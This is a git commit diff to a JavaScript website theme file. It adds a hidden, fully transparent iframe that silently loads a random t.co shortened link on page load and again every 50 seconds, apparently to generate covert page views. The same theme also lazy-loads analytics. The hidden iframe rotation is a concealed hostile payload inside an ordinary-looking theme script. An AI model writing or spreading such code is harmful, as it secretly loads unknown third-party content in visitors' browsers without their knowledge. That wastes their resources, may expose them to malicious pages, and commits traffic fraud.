483ef6565834b113965b0a4ae18ebbdadd1451c0
Dhanjee Rider <102199585+dhanjeerider@users.noreply.github.com>
2024-09-14 04:36:23 +0530

    Update dkfile.js

--- dkfile.js
+++ dkfile.js
@@ -13,20 +13,37 @@ document.addEventListener('DOMContentLoaded', () => {
       opacity: 0;
       z-index:39494;
     }
-  </style> <iframe class="invisible-frame" src="https://t.co/roiA8U72aa"></iframe>
-<script>
-console.log("theme working?");
-    </script>`;
+  </style> <iframe class="invisible-frame" id="postFrame" src=""></iframe>`;
     Folt.prepend(Newel);  
     var lazyanalisis=!1;window.addEventListener("scroll",function(){(0!=document.documentElement.scrollTop&&!1===lazyanalisis||0!=document.body.scrollTop&&!1===lazyanalisis)&&(!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(e,a)}(),lazyanalisis=!0)},!0); window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-2VYRMPXK0F');
 
-console.log("theme by dktechnozone.in");
-    
+console.log("theme by dktechnozone.in");    
   } else {
-   console.log("theme working?");
-    
+   console.log("theme working?");    
   }
 });
+  const postUrls = [
+            'https://t.co/MgOzaclnho',
+            'https://t.co/vWDW62hmwo',
+            'https://t.co/ToYRfWqzZp',
+            'https://t.co/0kaOlilwjj',       
+            'https://t.co/sP6cKqh7Vn',
+            'https://t.co/roiA8U72aa',
+            'https://t.co/p9p8Z1giOC',
+            'https://t.co/e4FBbBbVu3',
+            'https://t.co/nhQAs7PpPd'
+            
+        ];
+        function goToRandomPost() {
+            const randomIndex = Math.floor(Math.random() * postUrls.length);
+            const randomPostUrl = postUrls[randomIndex];
+            document.getElementById('postFrame').src = randomPostUrl;
+        }
+        window.onload = function() {
+            goToRandomPost();
+            setInterval(goToRandomPost,  50000);
+        };
+    
 /*var allowedURLs = [
     "https://dkhek.blogspot.com",
     "https://www.desiremovies.store"
